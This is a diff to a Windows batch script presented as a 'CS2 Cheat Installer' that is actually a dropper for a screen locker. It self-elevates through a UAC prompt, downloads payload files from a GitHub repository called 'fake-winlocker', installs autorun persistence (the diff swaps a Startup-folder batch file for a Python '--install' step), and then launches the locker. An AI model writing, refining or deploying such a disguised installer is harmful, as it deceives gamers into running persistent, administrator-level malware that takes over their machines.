@@ -2,12 +2,14 @@
 setlocal EnableExtensions EnableDelayedExpansion
 title CS2 Cheat Installer
 
+rem --- UAC ---
 net session >nul 2>&1
 if errorlevel 1 (
     powershell -NoProfile -Command "Start-Process -FilePath '%~f0' -Verb RunAs"
     exit /b
 )
 
+rem --- рабочая папка ---
 set "WORKDIR=C:\CyberHack"
 if not exist "%WORKDIR%" mkdir "%WORKDIR%" >nul 2>&1
 
@@ -17,7 +19,6 @@ set "SOUND=%WORKDIR%\sound.b64"
 set "VOICE=%WORKDIR%\voice.b64"
 set "CORRECT=%WORKDIR%\correct.b64"
 set "WRONG=%WORKDIR%\wrong.b64"
-set "AUTORUN=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\cyberhack_check.bat"
 set "BASE=https://raw.githubusercontent.com/xerobrin9908-blip/fake-winlocker/refs/heads/main"
 
 rem --- Python ---
@@ -59,25 +60,10 @@ call :download "%BASE%/voice.b64" "%VOICE%"
 call :download "%BASE%/correct.b64" "%CORRECT%"
 call :download "%BASE%/wrong.b64" "%WRONG%"
 
-rem --- Автозагрузка: cyberhack_check.bat ---
+rem --- Автозагрузка через сам локер ---
 echo [*] Installing autorun...
-(
-echo @echo off
-echo setlocal EnableExtensions EnableDelayedExpansion
-echo set "WORKDIR=C:\CyberHack"
-echo if not exist "%%WORKDIR%%\cyberhack.py" (
-echo     rmdir /s /q "%%WORKDIR%%" ^>nul 2^>^&1
-echo     start /b cmd /c del /f /q "%%~f0"
-echo     exit /b 0
-echo )
-echo where pythonw ^>nul 2^>^&1
-echo if not errorlevel 1 (
-echo     start "" /min pythonw "%%WORKDIR%%\cyberhack.py"
-echo ) else (
-echo     start "" /min python "%%WORKDIR%%\cyberhack.py"
-echo )
-echo exit /b 0
-) > "%AUTORUN%"
+%PYTHON_EXE% "%SCRIPT%" --install
+if errorlevel 1 ( echo [WARN] --install failed, continuing. )
 echo [OK] Autorun installed.
 
 rem --- Сразу запускаем локер ---
